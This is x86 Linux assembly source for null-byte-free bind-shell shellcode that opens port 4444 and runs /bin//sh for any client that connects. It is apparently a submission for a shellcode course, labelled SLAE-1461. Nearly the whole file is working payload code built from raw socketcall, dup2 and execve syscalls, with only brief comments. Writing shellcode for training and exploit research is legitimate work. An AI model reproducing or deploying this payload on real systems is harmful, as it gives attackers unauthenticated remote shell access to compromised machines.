; Bind shell to port 4444, should have no null bytes
; Author: Ty Gast // SLAE-1461

global _start

section .text
_start:

  ; socket call
  xor eax, eax
  push eax		; push 0x0 for protocol
  inc eax
  mov ebx, eax		; Call 1 (socket) for sys_socketcall
  push eax		; push 0x1 for type
  inc eax
  push eax		; push 0x2 for domain
  mov ecx, esp		; Args* for sys_socketcall
  mov al, 0x66		; sys_socketcall value
  int 0x80

  ; bind call
  mov esi, eax		; return value from socket call
  pop ebx		; loads 2 in ebx in prep for bind call
  pop edx		; loads 1 in edx then shift to get 0x10
  shl edx, 4
  ;xor eax, eax
  ;push eax
  mov ax, 0x5c11	; build sockaddr_in, avoid the 0x00 byte
  shl eax, 16
  mov al, 2		
  push eax
  mov ecx, esp		; get address for sockaddr_in *
  push edx
  push ecx
  push esi
  mov ecx, esp
  xor eax, eax
  mov al, 0x66
  int 0x80

  ; listen call
  mov [esp + 4], eax	; put zero (we hope) in the stack
  mov al, 0x66
  mov bl, 4
  int 0x80

  ; accept call
  inc ebx
  mov al, 0x66
  int 0x80

  ; connection received, iterate throug dup2 with the new fd in eax
  mov ebx, eax		; save off new fd
  pop ecx		; pull down the old fd
repeat_dup2:
  mov al, 0x3f
  int 0x80
  dec ecx		; decrement ecx and repeat dup2 if not negative
  jns repeat_dup2

; sys_execve to run a shell
  xor eax, eax
  push eax
  push 0x68732f6e
  push 0x69622f2f
  mov ebx, esp
  push eax
  mov edx, esp
  push ebx
  mov ecx, esp
  mov al, 11
  int 0x80


